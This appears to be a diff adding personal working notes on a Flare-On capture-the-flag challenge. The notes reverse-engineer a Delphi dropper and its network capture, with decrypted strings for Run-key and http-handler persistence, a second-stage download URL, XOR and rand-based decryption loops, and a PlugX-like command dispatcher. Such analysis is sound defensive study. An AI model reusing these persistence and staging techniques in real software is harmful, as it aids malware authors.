@@ -1,0 +1,2346 @@
+Sorry, we don't have a challenge for you. We were hacked and we think we lost it. Its name was "lab10" . The attacker left one binary behind and our sophisticated security devices captured network traffic (pcap) that may be related. If you can recover the challenge from this and solve it then you win the Flare-On Challenge. If you can't then you do not win it.
+
+20170801_1300_filtered.pcap
+coolprogram.exe
+
+
+Coolprogram:
+
+    Registry::TRegistry::WriteString == Delphi
+
+Load in Interactive Delphi Reconstructor
+Parses as D2006, pulls out run() and coolprogram()
+
+DeDe
+Created output MAP file for IDA
+
+Encrypted string:
+dword_410258 dd 50B0C1Eh, 0A071C08h, 1A1A0801h, 161D1A00h, 0C1D1C04h, 4911h, 0FFFFFFFFh
+.text:0041056D mov     ebx, off_413A70
+.text:00410573 movzx   ebx, byte ptr [ebx+edx-1]
+.text:00410578 xor     bl, 49h
+.text:0041057B mov     [ecx], bl
+
+= WEBLAUNCHASSIST_MUTEX
+
+dword_410278 dd 5F515644h, 505D4652h, 4040525Bh, 1D47405Ah, 33564B56h, 0
+= weblaunchassist.exe
+
+unk_410354 db  6Ah ; j                  ; DATA XREF: .data:off_413A88o.text:00410355 db 76h, 7Fh, 6Dh
+= SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+.text:00410290 _str_1______________ dd 0FFFFFFFFh
+= WebLaunchAssist
+
+Registry:KeyExists - WebLaunchAssist  ??
+
+dword_41038C dd 17050C30h, 6110214h, 20F203Fh, 10061010h, 17170B3Fh, 0B103F13h, 3F0F0F06h
+Software\Classes\http\shell\open\command
+
+dword_4102B4 dd 307071Bh, 1E5C5C49h, 16110A12h, 6005Dh, 1A101A03h, 5D00061Ch, 5C1C07h
+= http://maybe.suspicious.to/secondstage
+
+dword_4102E4 dd 81B0E2Ch, 4E000D0Dh, 41514F54h, 0C0E0249h, 8150011h, 5A040D03h, 28322C41h
+= Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+
+dword_410330 dd 15131331h, 3C5D0400h, 5171E11h, 4A151711h, 5D1E1550h, 7A7D0305h, 70h
+= Accept-Language: en-us
+
+Funny money
+.text:0041096C                   sub_41096C proc near                    ; DATA XREF: .data:off_413A94o
+.text:0041096C 2A 2F             sub     ch, [edi]
+.text:0041096E 2A 00             sub     al, [eax]
+.text:0041096E                   sub_41096C endp
+
+Silly IDA. That's not a function, it's "*/*"
+
+Decrypt, save memory snapshot, apply to binary
+
+
+Switch to PCAP:
+4   0.000945    192.168.221.91  52.0.104.200    HTTP    250 GET /secondstage HTTP/1.1
+
+GET /secondstage HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
+Host: maybe.suspicious.to
+Cache-Control: no-cache
+
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/2.7.12
+Date: Tue, 01 Aug 2017 17:04:02 GMT
+Content-type: application/octet-stream
+Content-Length: 119812
+Last-Modified: Tue, 01 Aug 2017 14:46:13 GMT
+
+7.=|..
+
+120Kb payload:
+000000CC  37 d8 3d 7c d4 88 1d 57  45 7a 8a e5 d0 e1 fd 3a   7.=|...W Ez.....:
+000000DC  26 b8 75 42 4c 41 14 35  f3 73 75 b3 f1 6d a3 e1   &.uBLA.5 .su..m..
+000000EC  3e 6a dd 2d ef 09 34 c1  01 7c b0 d6 f0 ca b3 4d   >j.-..4. .|.....M
+000000FC  75 25 52 7b 11 f4 fd a3  f3 88 c6 55 ef c5 28 46   u%R{.... ...U..(F
+0000010C  6c 85 3b b8 2f c1 91 89  c2 82 51 4d cb 47 8b 17   l.;./... ..QM.G..
+0000011C  15 4f 72 1c 72 5a 76 15  3e c5 ee b6 d7 eb 38 dc   .Or.rZv. >.....8.
+0000012C  64 2b 12 07 d9 fe 2d 45  f5 cb c0 f1 92 db 3d e8   d+....-E ......=.
+0000013C  1b fe 35 ac 8d ad 4c c8  cb 5b e2 62 69 65 19 c2   ..5...L. .[.bie..
+0000014C  83 2a 81 f2 a1 9c 81 ff  ce 38 e0 80 94 ce b2 2c   .*...... .8.....,
+0000015C  2a ed 2b 59 12 38 d9 2f  90 ca 87 2f 25 06 3b 2d   *.+Y.8./ .../%.;-
+
+Whatever was downloaded was run through algo below and written to memory:
+  v14 = 0;
+  do
+  {
+    v6 += (v6 >> 3) + 0x22334455;
+    v7 += (v7 >> 5) + 0x11223344;
+    v8 = -127 * v8 + 0x44556677;
+    v15 = -511 * v15 + 0x33445566;
+    *(*a5 + v14) = *(v17 + v14 + v16) ^ (v6 + v7 + v8 + v15);
+    ++v14;
+    --v13;
+  }
+  while ( v13 );
+
+
+Meh, cba to rewrite. Just feed it back with local tcp server
+
+Throw up python -m SimpleHTTPServer 80 in folder, set maybe.suspicious.to in Windows Hosts
+Outputs an EXE: size 119,814 (0x1D406)
+
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000  01 00 00 00 02 D4 01 00 4D 5A 90 00 03 00 00 00  .....Ô..MZ......
+00000010  04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00  ....ÿÿ..¸.......
+00000020  40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  @...............
+0x1D402 being actual size
+
+.text:00410F39 E8 3E 4E FF FF    call    sub_405D7C
+Calls system move(). Never seen that before.
+
+.text:00410F80 8B C6             mov     eax, esi
+.text:00410F82 E8 F5 4D FF FF    call    sub_405D7C
+.text:00410F87 FF 45 D8          inc     [ebp+var_28]
+
+A second call, loads a big block of ... other code? 558B is func
+01DE9DE0  55 8B EC 51 33 C0 88 45  FF 8B E5 5D C3 CC CC CC  Uï8Q3+êE ïs]+¦¦¦
+01DE9DF0  55 8B EC 51 33 C0 88 45  FF 8B E5 5D C3 CC CC CC  Uï8Q3+êE ïs]+¦¦¦
+01DE9E00  55 8B EC 51 33 C0 88 45  FF 8B E5 5D C3 CC CC CC  Uï8Q3+êE ïs]+¦¦¦
+
+Doesn't .. work? It goes into a math loop, but never hits WriteProcessMemory.
+
+
+
+
+ if ( *v4[1] == 0x20170417 ) == egg?
+ 17 Apr 2017 - Blackhawk helicopter crashes in MD. Shooting of Robert Godwin. That's a depressing day.
+
+ Decoding:
+ int __cdecl sub_403A50(int a1, _BYTE *a2, int a3)
+{
+  int v3; // ST00_4@2
+  _BYTE *v5; // [esp+4h] [ebp-4h]@1
+  unsigned int i; // [esp+10h] [ebp+8h]@1
+
+  v5 = a2;
+  for ( i = ~a1; ; i = dword_41C010[(i ^ *v5++)] ^ (i >> 8) )
+  {
+    v3 = a3--;
+    if ( !v3 )
+      break;
+  }
+  return ~i;
+}
+
+
+PCAP.
+Session 0 is the encoded secondstage.
+Session 1 is another exe, looks like .NET, with header/footers:
+
+Challenge: 2017...A$...^...^...Q).t.g..)A.....E....B...B....q&...a~...BLZ!... .................[.J....sF...+..w.e.l.c.o.m.e.p.a.s.s.1.!.1...
+Response : 2017U.,.$...@...@...Q).t.g..)A.....E....$...$....q&...a~...BLZ!... .................[.J....sF...+..
+
+welcomepass1!1 -- almost like Poison Ivy menuPass
+
+There some portions of EXE, but it can't be that easy.
+
+XBBBBwcBBBBCtBBBJrO8edIfdRQu7lB2tCUKLcpOj9BABBBBBBBBBBBBBBBBBBBB0hT4CMc32QQUccwBx1zRuMLySHi5l6PF/BBBBb7BBB7ltBBBDFRCvVN1zVc3hxq2nuCmSkz1Zj/+Wb94r4YxwBBbfEenFy/NISSZKN0X5o0lYiqPEfyP22fsGaMSPo6+aRLQ92R64F<CUT>Wh9hBRukk5uUh4d=2017.4.0
+qqqLq.q.q.qoqqqLq.q.q.q
+qqq2q.q.qoq.qqq2q.q.q.q.qqq.q3q.qoq&qqq.q.q.qoq.qqq.q.q.q.q.qqq.q.q.q.q$qqq.q.q.q.q.qqq.q.q.qZq
+qqq.q.q.q
+q$qqq.q.q.q
+q.qqq2q.q.q.q
+qqq3qNq.q&qdqqq3q_q.q.q.qqq3q.q.q&q.qqq.q2q.q.q.qqq.q.q.q.q
+qqq.q.q.q.qdqqq.q.q.qoq.qqq.qNq.q.q.qqq.q.q.qZq.qqq3q.q.q&qoqqq.q.q.q.q.qqq.q.q.q.q.qqq.q.q.q.q.qqqLq.q.qoq
+XBBBBjlwBB7dBlBBJrO8edIfdRQu7lB2tCUKLcpOj9BbBBBBKyBBBBBBBBBBBBBBhXUc7ykvKd7CNfoaTzWyUMtFCUFzUlfrSxIF4/5709JBBBBBBBBBBBAYBtBBBBBB3yWrDX3saFZU4xiT2slJAUoxHSGMBAvBRB73BXtBdt7zBbCBTl7zBjyBpy79BXdBSlB1BbYBiB7fBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB==2017
+
+It looks like the same set of data over and over... 1.8MB down from C2, 3.3MB up to C2
+
+Alright, so coolprogram.exe > pcap > secondstage.exe > pcap > ... thirdstage.exe?
+
+Force the WriteMemory to run.
+
+Extract payload:
+File Name       : secondstage-guess2.exe
+File Size       : 143,360
+CRC32           : 2b4058a1
+MD5             : 93f4e58a4ae6038443216bab4f66cc77
+SHA1            : fe69e8702bf34a22fd6872f8aac8a04137608e19
+SHA256          : aa10076176dcb4ae828068d7b8ec67d0c6695587265f0c47d6be6a9e54473b50
+Fuzzy           : 3072:gFCuyQy6MSq4llPHfgodU2KKr5l/w4nd1f8g0Vv:puyQy6LlFNkK0gd150
+Magic           : PE32 executable for MS Windows (GUI) Intel 80386 32-bit
+Import Hash     :
+Compiled Time   : Wed May 31 20:09:23 2017 UTC
+PE Sections (5) : Name       Size       MD5
+                  .text      78,848     e447de6c4a41eb96fb96bdcb0ae2567f
+                  .rdata     28,160     b4811be86a5b2350d8b1772a34eac0f8
+                  .data      6,144      c3262c829cebb6a932fe79c6f873bdac
+                  .rsrc      512        bf619eac0cdf3f68d496ea9344137e8b
+                  .reloc     5,120      e8685fc1bceb1285eab8c1d7c52cfcdb
+                + 0x1d400    23,552     2336a34ec4cb5370d492d8f5dd0efff9
+SignSrch        : offset   num  description [bits.endian.size]
+                  3f809165 1299 classical random incrementer 0x343FD 0x269EC3 [32.le.8&]
+
+
+x32dbg tap into iexplore, search for hex code : 55 8B EC 51 33 C0 88 45
+Find, EBFE it? Ugh but where?
+
+Results I got from first secondstage guess seemed better, before all the code moves:
+File Name       : secondstage.exe
+File Size       : 119,810
+CRC32           : c4c86971
+MD5             : 467b5596febb12997d49ed03d1065829
+SHA1            : 89b1167c121343572a88509ec1d488750d4416e3
+SHA256          : 329a0e5732d61b07b0cf9393cb88de4bdff9d2644fae2a9a5f391a4008f11427
+Fuzzy           : 3072:nFCuyQy6MSq4llPHfgodU2KKr5l/w4nd1f8g0Vvo:UuyQy6LlFNkK0gd150S
+Magic           : PE32 executable for MS Windows (GUI) Intel 80386 32-bit
+Import Hash     :
+Compiled Time   : Wed May 31 20:09:23 2017 UTC
+PE Sections (5) : Name       Size       MD5
+                  .text      78,848     791a1cbd40a0fa43363c223efa98e50f
+                  .rdata     28,160     4e4b5ae94bb098718d4c8d56a9a15075
+                  .data      6,144      c436e0089b63369390c8d676525c1d68
+                  .rsrc      512        afee9aa4e6e08486556da2af730eb741
+                  .reloc     5,120      fef6f85a4e119ff83a3e169d4c01870f
+                + 0x1d400    2          12361511d6d4b40e2896841c5047ad72
+SignSrch        : offset   num  description [bits.endian.size]
+                  00408565 1299 classical random incrementer 0x343FD 0x269EC3 [32.le.8&]
+
+It actually has a WinMain and code that makes sense ...
+
+So let's take it's WinMain and EBFE those bytes.
+55 8B EC B8 B4 1A 00 00  E8 E3 32 00 00 A1 50 C4
+
+Found in a random space, ugh
+Address=000000003F800000
+Size=0000000000023000
+Allocation Type=PRV
+Current Protection=ERW--
+Allocation Protection=ERW--
+
+Found code:
+000000003F805220 | 55                       | push rbp                                |
+000000003F805221 | 8B EC                    | mov ebp,esp                             |
+000000003F805223 | B8 B4 1A 00 00           | mov eax,1AB4                            |
+
+changed to EB FE 90, ran, searched:
+Address          Data
+0000000004003456 EB FE 90
+00000000047EE992 EB FE 90
+000000003F805220 EB FE 90
+000007FEFE7E9BF6 EB FE 90
+
+None look related except original, third
+
+OK, try same, stop at GetThreadContext for injected IE, find that thread in X32dbg and EBFE there.
+
+Screw it. The original EXE I have is good enough. It's import table is broken, but does have stack string for 2017, and network encryption stuff
+
+int __cdecl DecryptBlockOfData(unsigned int *a1, _BYTE *a2, int a3)
+{
+  srand(*a1);
+  v6 = (a1 + 1);
+  for ( i = 0; i < a3; ++i )`
+  {
+    v3 = *v6;
+    *a2++ = rand() ^ v3;
+    ++v6;
+  }
+  return 0;
+}
+DecryptBlockOfData(&unk_415278, &v8, 1036);
+  if ( v8 != 0x20170417 ):
+
+So feed in encrypted data. Seed is first byte? dword? Go 1036 bytes and val ^ rand() into &v8
+
+Ran: python auto_find_asm_xor.py secondstage.exe > 12\auto_enc.txt
+
+sub_403A50  xor ecx, 0FFFFFFFFh
+sub_403A50  xor edx, [ebp+arg_0]
+sub_403A50  shr eax, 8
+sub_403A50  xor eax, dword_41C010[edx*4]
+sub_403A50  xor eax, 0FFFFFFFFh
+
+sub_4053A0  shr eax, 1
+sub_4053A0  shl edx, 0
+sub_4053A0  shl ecx, 0
+sub_4053A0  shl eax, 0
+sub_4053A0  xor edx, 0ABCDABCDh
+
+
+sub_40F36F  shl ch, 1
+sub_40F36F  shl cl, 1
+sub_40F36F  shl ah, 1
+sub_40F36F  shl ah, 1
+sub_40F9B5  xor eax, dword_41C450
+
+sub_41108F  xor eax, ebp
+sub_41108F  shl eax, 10h
+sub_41108F  shl eax, cl
+sub_41108F  shl eax, cl
+sub_41108F  shl eax, cl
+sub_41108F  shl eax, cl
+
+
+sub_411601  shr edx, 1Fh
+sub_411601  shr ecx, 1Fh
+sub_411601  shl eax, 1Fh
+sub_411601  xor ecx, [esi+4Bh]
+sub_411601  xor eax, 0D64720D6h
+sub_411601  xor [ebx], dl
+sub_411601  xor al, 0A9h
+sub_411601  xor [ecx+356B0523h], edi
+sub_413240  xor [ecx+2DD8CE3Bh], eax
+sub_413411  shl dword ptr [esi], cl
+sub_413555  xor eax, 0BB61210Bh
+sub_413555  xor eax, 0F961ACA6h
+sub_413555  xor dl, [eax-4Ah]
+
+411601, 41108F, 40F36F are huge on byte-level encodings
+411601 - ignore, part of atoflt
+41108F - ignore, part of atodbl
+40F36F - ignore, part of NMSG_WRITE
+
+sub_4053A0  xor edx, 0ABCDABCDh
+That gets me to it. parent function has:
+ switch ( a4 )
+  {
+    case ' DMC':
+    case 'TPRC':
+    case 'PMOC':
+    default:
+
+CMD
+CRPT
+COMP
+  if ( *a1 != 'ML' )
+    return 0;
+  v16 = *(a1 + 60) + a1;
+  if ( *v16 != 'PON' )
+    return 0;
+  if ( *(v16 + 4) != '23' )
+    return 0;
+
+Starts from unstructured proc: sub_404D60
+  switch ( *(a2 + 4) )
+    {
+      case 2:
+        v5 = sub_4048B0(v4, a2, a3);
+        break;
+      case 3:
+        v5 = sub_404380(v4, a2, a3);
+        break;
+      case 4:
+        v5 = Function_SendCmd(v4, a2, a3);
+        break;
+      case 5:
+        v5 = sub_403F60(v4, a2, a3);
+        break;
+      case 6:
+        v5 = sub_403DB0(v4, a2, a3);
+        break;
+      case 7:
+        v5 = sub_404630(v4, a2, a3);
+        break;
+      case 8:
+        v5 = sub_4042A0(v4, a2, a3);
+        break;
+      case 9:
+        v5 = Function_Unused(a2, a3);
+        break;
+      case 0xA:
+        v5 = Function_Unused(a2, a3);
+        break;
+      case 0xB:
+        v5 = sub_4047A0(v4, a2, a3);
+        break;
+      case 0xD:
+        v5 = sub_4041B0(v4, a2, a3);
+        break;
+      case 0xE:
+        v5 = sub_4040E0(v4, a2, a3);
+        break;
+      default:
+        v7 = *(a2 + 4);
+        v8 = *(a2 + 8);
+        v6 = 0x20170417;
+        v9 = 0x100001;
+
+
+Yeah!
+No!
+Network structure with a huge case. PIVY/PlugX? There's some things that look the same
+https://blog.fortinet.com/2017/09/15/deep-analysis-of-new-poison-ivy-plugx-variant-part-ii
+https://www.blackhat.com/docs/asia-14/materials/Haruyama/Asia-14-Haruyama-I-Know-You-Want-Me-Unplugging-PlugX.pdf
+https://github.com/kcreyts/plugxdecoder
+
+
+Check for AH/AL separation?
+C:\Users\Admin\Desktop>grep "shl.*10h" secondstage.asm -C5
+                sub     edx, 3FFFh
+                mov     [ebp+var_10], eax
+                mov     eax, [ecx+2]
+                mov     [ebp+var_C], eax
+                movzx   eax, word ptr [ecx]
+                shl     eax, 10h
+                mov     [ebp+var_20], edx
+                mov     [ebp+var_8], eax
+                cmp     edx, 0FFFFC001h
+                jnz     short loc_41110C
+                mov     esi, ebx
+--
+                sub     edx, 3FFFh
+                mov     [ebp+var_10], eax
+                mov     eax, [ecx+2]
+                mov     [ebp+var_C], eax
+                movzx   eax, word ptr [ecx]
+                shl     eax, 10h
+                mov     [ebp+var_20], edx
+                mov     [ebp+var_8], eax
+                cmp     edx, 0FFFFC001h
+                jnz     short loc_41167E
+                mov     esi, ebx
+
+As per JPCert preso (<3 Haruyama) - PlugX key dword as date: 20121107h
+This is definitely variant of plugx. But, typical encryption routine not seen.
+
+hmm
+sub_401190      shl     ecx, 7
+
+ooh
+  v5 = v4 ^ (v4 >> 11) ^ ((v4 ^ (v4 >> 11)) << 7) & 0x9D2C5680;
+  return v5 ^ (v5 << 15) & 0xEFC60000 ^ ((v5 ^ (v5 << 15) & 0xEFC60000) >> 18);
+
+Nope. That's a Mersenne Twister routine :/
+
+
+Is 2017 the network encryption key? PlugX typically had a four-byte one...
+
+
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000  32 30 31 37 AF F1 81 41 24 00 00 00 5E 00 00 00  2017¯ñ.A$...^...
+00000010  5E 00 00 00 51 29 8F 74 16 67 D7 ED 29 41 95 01  ^...Q).t.g×í)A•.
+00000020  06 F5 05 45 1C 00 00 00 42 00 00 00 42 00 00 00  .õ.E....B...B...
+00000030  F3 71 26 AD 88 A5 61 7E AF 06 00 0D 42 4C 5A 21  óq&.ˆ¥a~¯...BLZ!
+00000040  17 04 17 20 0E 00 00 00 00 00 00 00 00 00 00 00  ... ............
+00000050  00 00 00 00 15 5B BF 4A 1E FE 15 17 73 46 04 B9  .....[¿J.þ..sF.¹
+00000060  D4 2B 80 E8 77 00 65 00 6C 00 63 00 6F 00 6D 00  Ô+€èw.e.l.c.o.m.
+00000070  65 00 70 00 61 00 73 00 73 00 31 00 21 00 31 00  e.p.a.s.s.1.!.1.
+00000080  00 00                                            ..
+
+
+>>> removed and moved to bottom now that I know it for real.
+
+
+
+It also applies even if Sysinternals knew or should have known about the possibility of the damages.  The above limitation or exclusion may not apply to you because your country may not allow the exclusion or limitation of incidental, consequential or other damages.\par..\pard\b Please note: As this software is distributed in Quebec, Canada, some of the clauses in this agreement are provided below in French.\par.\pard\sb240\lang1036 Remarque : Ce logiciel \'e9tant distribu\'e9 au Qu\'e9bec, Canada, .......S.Y.S.I.N.T.E.R.N.A.L.S. .S.O.F.T.W.A.R.E. .L.I.C.E.N.S.E.
+
+Ugh, they're transferring psexec in there as well?
+
+PlugX uses RtlCompressBuffer(), RtlDecompressBuffer
+
+.E...ineI.E.5ntel.5 0.....E.5Genu....j...X..j.Y.....
+GetCurrentProcessIdGetSystemTimeAsFileTime'GetEnvironmentStringsWFreeEnvironmentStringsWUnhandledExceptionFilterASetUnhandledExceptionFilterHInitializeCriticalSectionAndSpinCountPSleep        GetCurrentProcess_TerminateProcessqTlsAllocsTlsGetValuetTlsSetValuerTlsFreegGetModuleHandleWrIsValidCodePageGetACPGetOEMCPGetCPInfoRtlUnwindLCMapStringWWriteFilecGetModuleFileNameWLoadLibraryExW/HeapAlloc6HeapReAllocFlushFileBuffersGetConsoleCPGetConsoleModeGetStringTypeWSetFilePointerExOutputDebugStringWCloseHandle SetStdHandleWriteConsoleWCreateFileW
+SHA-1 test #%d: failed
+passed
+
+000b10b0: 0000 0000 0000 0000 0000 0000 0000 2020  ..............
+000b10c0: 5348 412d 3120 7465 7374 2023 2564 3a20  SHA-1 test #%d:
+000b10d0: 0000 6661 696c 6564 0a00 7061 7373 6564  ..failed..passed
+000b10e0: 0a00 0a00 0000 f47c 5107 0fa8 6980 64b6  .......|Q...i.d.
+000b10f0: 5b3b 6e7d 30c6 0000 0000 0000 0000 4ee6  [;n}0.........N.
+
+That sounds promising (edit -- nope, it's a generic library - wasted a retrohunt and 300 downloads on that)
+
+
+Find all the exe headers and commands:
+
+
+0001f8a0: 80e8 434d 4420 0000 0000 0000 0000 0000  ..CMD ..........
+0001f930: 9501 06f5 0545 4352 5054 0000 0000 0000  .....ECRPT......
+0001f9c0: 617e af06 000d 424c 5a21 434f 4d50 0000  a~....BLZ!COMP..
+0001fd00: a724 3764 69cf 6782 4352 5054 0000 0000  .$7di.g.CRPT....
+
+... 0x690 ...
+
+0001ff30: 2e72 6461 7461 0000 3646 0000 00d0 0000  .rdata..6F......
+0001ff80: 2e72 7372 6300 0000 e001 0000 0050 0100  .rsrc........P..
+
+
+00024270: 4352 5054 0040 0000 002e 0100 0040 0000  CRPT.@.......@..
+000287d0: a724 3764 69cf 6782 4352 5054 0080 0000  .$7di.g.CRPT....
+0002cd40: 4352 5054 00c0 0000 002e 0100 0040 0000  CRPT.........@..
+
+0002d310: 0010 0000 0000 6d00 7300 6300 6f00 7200  ......m.s.c.o.r.
+0002d320: 6500 6500 2e00 6400 6c00 6c00 0000 436f  e.e...d.l.l...Co
+
+000312a0: a724 3764 69cf 6782 4352 5054 0000 0100  .$7di.g.CRPT....
+000346f0: 61f7 5c90 cb3f 5915 4352 5054 0000 0000  a.\..?Y.CRPT....
+00038e30: 74fc 61f7 5c90 cb3f 5915 4352 5054 0040  t.a.\..?Y.CRPT.@
+00041920: 74fc 61f7 5c90 cb3f 5915 4352 5054 00c0  t.a.\..?Y.CRPT..
+00048f00: 5915 4352 5054 002c 0100 002c 0100 0000  Y.CRPT.,...,....
+0005a850: d3fe d171 0e60 4352 5054 0000 0100 0032  ...q.`CRPT.....2
+00063e90: f443 5250 5400 4000 0000 3201 0000 4000  .CRPT.@...2...@.
+000841e0: 0a92 cbe4 2510 9690 ce7d a243 4f4d 5000  ....%....}.COMP.
+0009b3f0: 90ce 7da2 434f 4d50 0000 0200 0034 0200  ..}.COMP.....4..
+000afbd0: 0fa8 6980 64b6 5b3b 6e7d 30c6 434d 4420  ..i.d.[;n}0.CMD
+000c6670: 5643 4d44 2000 0001 0000 5601 0000 4000  VCMD .....V...@.
+000dd6a0: 4d13 8a1b fbd5 434d 4420 0000 0100 0034  M.....CMD .....4
+
+001ba430: 2053 7973 696e 7465 726e 616c 7320 6e27   Sysinternals n'
+
+001d28f0: 0c8b 55f8 c742 1043 4f4d 506a 3f8b 45dc  ..U..B.COMPj?.E.
+001ea060: 37ae b145 1080 7ee9 d7be 434d 4420 0000  7..E..~...CMD ..
+
+... 0x220 ...
+
+001ea280: 0000 0000 0000 2000 0060 2e72 6461 7461  ...... ..`.rdata
+001ea2d0: 0000 0000 0000 4000 00c0 2e72 7372 6300  ......@....rsrc.
+
+001fd070: fef9 3533 4352 5054 0000 0000 0046 0100  ..53CRPT.....F..
+0021a3f0: c1b9 cf3f 11ec ae78 a3a4 bc43 5250 5400  ...?...x...CRPT.
+0024b4d0: 8322 5449 434f 4d50 0000 0000 006a 0100  ."TICOMP.....j..
+0040b370: 4a56 4b72 4d72 3362 4443 5250 5442 774a  JVKrMr3bDCRPTBwJ
+004aa9e0: 3b6e 7d30 c643 4d44 2000 c000 0000 7601  ;n}0.CMD .....v.
+
+
+
+Try to find .net exe transfer:
+
+0001fd00: a724 3764 69cf 6782 4352 5054 0000 0000  .$7di.g.CRPT....
+0001fd10: 002e 0100 0040 0000 4c4d 0000 0000 0000  .....@..LM......
+0001fd20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd50: 0000 0000 f800 0000 0000 0000 0000 0000  ................
+0001fd60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fd90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fda0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fdb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fdc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fdd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fde0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fdf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fe00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fe10: 4e4f 5000 3332 0500 23af 3e59 0000 0000  NOP.32..#.>Y....
+0001fe20: 0000 0000 e000 0221 0b01 0c00 00c0 0000  .......!........
+0001fe30: 0088 0000 0000 0000 ef9a cdab 0010 0000  ................
+0001fe40: 00d0 0000 0000 0010 0010 0000 0002 0000  ................
+0001fe50: 0600 0000 0000 0000 0600 0000 0000 0000  ................
+0001fe60: 0070 0100 0004 0000 0000 0000 0200 4001  .p............@.
+0001fe70: 0000 1000 0010 0000 0000 1000 0010 0000  ................
+0001fe80: 0000 0000 1000 0000 6010 0100 5600 0000  ........`...V...
+0001fe90: b810 0100 2800 0000 0050 0100 e001 0000  ....(....P......
+0001fea0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001feb0: 0060 0100 500d 0000 0000 0000 0000 0000  .`..P...........
+0001fec0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001fed0: 0000 0000 0000 0000 f80c 0100 4000 0000  ............@...
+0001fee0: 0000 0000 0000 0000 00d0 0000 f400 0000  ................
+0001fef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0001ff00: 0000 0000 0000 0000 2e74 6578 7400 0000  .........text...
+0001ff10: 1fbf 0000 0010 0000 00c0 0000 0004 0000  ................
+0001ff30: 2e72 6461 7461 0000 3646 0000 00d0 0000  .rdata..6F......
+0001ff40: 0048 0000 00c4 0000 0000 0000 0000 0000  .H..............
+0001ff50: 0000 0000 4000 0040 2e64 6174 6100 0000  ....@..@.data...
+0001ff60: 442f 0000 0020 0100 0012 0000 000c 0100  D/... ..........
+0001ff70: 0000 0000 0000 0000 0000 0000 4000 00c0  ............@...
+0001ff80: 2e72 7372 6300 0000 e001 0000 0050 0100  .rsrc........P..
+0001ff90: 0002 0000 001e 0100 0000 0000 0000 0000  ................
+0001ffa0: 0000 0000 4000 0040 2e72 656c 6f63 0000  ....@..@.reloc..
+0001ffb0: 500d 0000 0060 0100 000e 0000 0020 0100  P....`....... ..
+0001ffc0: 0000 0000 0000 0000 0000 0000 4000 0042  ............@..B
+0001ffd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+
+00022fa0: 0489 4f08 8957 0c8b 45e4 8b4d f089 45f4  ..O..W..E..M..E.
+00022fb0: 81f1 696e 6549 8b45 ec35 6e74 656c 8935  ..ineI.E.5ntel.5
+00022fc0: 2020 0110 0bc8 8b45 e835 4765 6e75 0bc8    .....E.5Genu..
+00022fd0: f7d9 6a01 1ac9 58fe c16a 0059 0fa2 8907  ..j...X..j.Y....
+00022fe0: 895f 0489 4f08 8957 0c8b 4dec 894d f874  ._..O..W..M..M.t
+00022ff0: 438b 45e4 25f0 3fff 0f3d c006 0100 7423  C.E.%.?..=....t#
+00023000: 3d60 0602 0074 1c3d 7006 0200 7415 3d50  =`...t.=p...t.=P
+
+0002cb80: 0000 ba00 0000 0050 56e8 99ee 000c 298a  .......PV.....).
+0002cb90: 49e4 0800 4500 00ac 3710 4000 8006 886f  I...E...7.@....o
+0002cba0: c0a8 dd5b 3400 68c8 c298 24e3 4ca2 6a1e  ...[4.h...$.L.j.
+0002cbb0: a280 175a 5018 faf0 f045 0000 3230 3137  ...ZP....E..2017
+0002cbc0: 7694 d709 2400 0000 6000 0000 6000 0000  v...$...`...`...
+0002cbd0: 5129 8f74 1667 d7ed 2941 9501 06f5 0545  Q).t.g..)A.....E
+0002cbe0: 1c00 0000 4400 0000 4400 0000 f371 26ad  ....D...D....q&.
+0002cbf0: 88a5 617e af06 000d 424c 5a21 1704 1720  ..a~....BLZ!...
+0002cc00: 0600 0000 0500 0000 0000 0000 0000 0000  ................
